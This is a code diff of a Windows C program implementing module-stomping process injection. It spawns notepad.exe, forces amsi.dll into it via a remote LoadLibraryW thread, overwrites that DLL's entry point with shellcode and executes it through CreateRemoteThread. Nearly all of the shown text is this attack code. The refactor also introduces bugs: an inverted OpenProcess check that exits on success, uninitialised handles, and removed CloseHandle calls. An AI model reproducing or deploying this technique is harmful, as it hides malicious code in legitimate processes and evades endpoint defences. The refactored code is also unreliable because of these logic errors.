@@ -12,8 +12,8 @@ INT main()
 	HMODULE					lphModule[256] = { 0 };
 	HMODULE					hRemoteModule;
 	HMODULE					hKernel32;
-	HANDLE					hProcess = NULL;
-	HANDLE					hDllThread = NULL;
+	HANDLE					hProcess;
+	HANDLE					hDllThread;
 	FARPROC					llLoadLibraryWAddress;
 	CONST SIZE_T			cbModulesSize = sizeof(lphModule);
 	DWORD					dwPid;
@@ -29,82 +29,77 @@ INT main()
 	startupInfo.cb = sizeof startupInfo;
 	ZeroMemory(&processInformation, sizeof processInformation);
 	
-	if (CreateProcessA(NULL, "\"notepad.exe\"", NULL, NULL, FALSE, 
+	if (!CreateProcessA(NULL, "\"notepad.exe\"", NULL, NULL, FALSE,
 		DETACHED_PROCESS, NULL, NULL, &startupInfo, &processInformation)) {
+		goto Cleanup;
+	}
 
-		dwPid = processInformation.dwProcessId;
-		if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid)) != INVALID_HANDLE_VALUE) {
+	dwPid = processInformation.dwProcessId;
+	if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid)) != INVALID_HANDLE_VALUE) {
+		goto Cleanup;
+	}
 
-			if ((pvRemoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof cModuleToInject, MEM_COMMIT, PAGE_READWRITE)) == NULL) {
-				goto Cleanup;
-			}
+	if ((pvRemoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof cModuleToInject, MEM_COMMIT, PAGE_READWRITE)) == NULL) {
+		goto Cleanup;
+	}
 
-			WriteProcessMemory(hProcess, pvRemoteBuffer, (LPVOID)cModuleToInject, sizeof cModuleToInject, NULL);
+	WriteProcessMemory(hProcess, pvRemoteBuffer, (LPVOID)cModuleToInject, sizeof cModuleToInject, NULL);
 
-			if ((hKernel32 = GetModuleHandleA("Kernel32")) == NULL) {
-				goto Cleanup;
-			}
-			
-			llLoadLibraryWAddress = GetProcAddress(hKernel32, "LoadLibraryW");
-			threadRoutine = (PTHREAD_START_ROUTINE)llLoadLibraryWAddress;
+	if ((hKernel32 = GetModuleHandleA("Kernel32")) == NULL) {
+		goto Cleanup;
+	}
+	
+	llLoadLibraryWAddress = GetProcAddress(hKernel32, "LoadLibraryW");
+	threadRoutine = (PTHREAD_START_ROUTINE)llLoadLibraryWAddress;
 
-			if ((hDllThread = CreateRemoteThread(hProcess, NULL, 0, threadRoutine, pvRemoteBuffer, 0, NULL))) {
-				WaitForSingleObject(hDllThread, 1000);
+	if ((hDllThread = CreateRemoteThread(hProcess, NULL, 0, threadRoutine, pvRemoteBuffer, 0, NULL))) {
+		WaitForSingleObject(hDllThread, 1000);
 
-				// find base address of the injected benign DLL in remote process
-				EnumProcessModules(hProcess, lphModule, cbModulesSize, &dwModulesSizeNeeded);
-				ullModulesCount = dwModulesSizeNeeded / sizeof(HMODULE);
+		// find base address of the injected benign DLL in remote process
+		EnumProcessModules(hProcess, lphModule, cbModulesSize, &dwModulesSizeNeeded);
+		ullModulesCount = dwModulesSizeNeeded / sizeof(HMODULE);
 
-				for (size_t i = 0; i < ullModulesCount; i++) {
-					hRemoteModule = lphModule[i];
-					GetModuleBaseNameA(hProcess, hRemoteModule, cRemoteModuleName, sizeof(cRemoteModuleName));
+		for (size_t i = 0; i < ullModulesCount; i++) {
+			hRemoteModule = lphModule[i];
+			GetModuleBaseNameA(hProcess, hRemoteModule, cRemoteModuleName, sizeof(cRemoteModuleName));
 
-					if (strcmp(cRemoteModuleName, "amsi.dll") == 0) {
-						printf("[+] %s at %p\n", cRemoteModuleName, (VOID*)lphModule[i]);
-						goto Continue;
-					}
-				}
-			}
-
-			goto Cleanup;
-
-Continue:
-			// get DLL's AddressOfEntryPoint
-			if ((lpTargetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize)) == NULL) {
-				goto Cleanup;
-			}
-
-			ReadProcessMemory(hProcess, hRemoteModule, lpTargetProcessHeaderBuffer, headerBufferSize, NULL);
-
-			CONST PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)lpTargetProcessHeaderBuffer;												// NOLINT(misc-misplaced-const)
-			CONST PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpTargetProcessHeaderBuffer + dosHeader->e_lfanew);
-			CONST LPVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)hRemoteModule);					// NOLINT(misc-misplaced-const)
-			printf("[*] Dll entryPoint at: %p\n", dllEntryPoint);
-
-			// write shellcode to DLL's AddressofEntryPoint
-			if (WriteProcessMemory(hProcess, dllEntryPoint, (LPCVOID)shellcode, sizeof shellcode, NULL)) {
-				// execute shellcode from inside the benign DLL
-				CreateRemoteThread(hProcess, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, NULL);
+			if (strcmp(cRemoteModuleName, "amsi.dll") == 0) {
+				printf("[+] %s at %p\n", cRemoteModuleName, (VOID*)lphModule[i]);
+				goto Continue;
 			}
 		}
 	}
 
+	goto Cleanup;
+
+Continue:
+	// get DLL's AddressOfEntryPoint
+	if ((lpTargetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize)) == NULL) {
+		goto Cleanup;
+	}
+
+	ReadProcessMemory(hProcess, hRemoteModule, lpTargetProcessHeaderBuffer, headerBufferSize, NULL);
+
+	CONST PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)lpTargetProcessHeaderBuffer;												// NOLINT(misc-misplaced-const)
+	CONST PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpTargetProcessHeaderBuffer + dosHeader->e_lfanew);
+	CONST LPVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)hRemoteModule);					// NOLINT(misc-misplaced-const)
+	printf("[*] Dll entryPoint at: %p\n", dllEntryPoint);
+
+	// write shellcode to DLL's AddressofEntryPoint
+	if (WriteProcessMemory(hProcess, dllEntryPoint, (LPCVOID)shellcode, sizeof shellcode, NULL)) {
+		// execute shellcode from inside the benign DLL
+		CreateRemoteThread(hProcess, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, NULL);
+	}
+	
 Cleanup:
 	if (lpTargetProcessHeaderBuffer) 
 		HeapFree(GetProcessHeap(), 0, lpTargetProcessHeaderBuffer);
-	
-	if (hProcess) 
-		CloseHandle(hProcess);
 	
 	if (processInformation.hProcess) 
 		CloseHandle(processInformation.hProcess);
 	
 	if (processInformation.hThread) 
 		CloseHandle(processInformation.hThread);
-	
-	if (hDllThread) 
-		CloseHandle(hDllThread);
-	
 		
 	return ERROR_SUCCESS;
 }
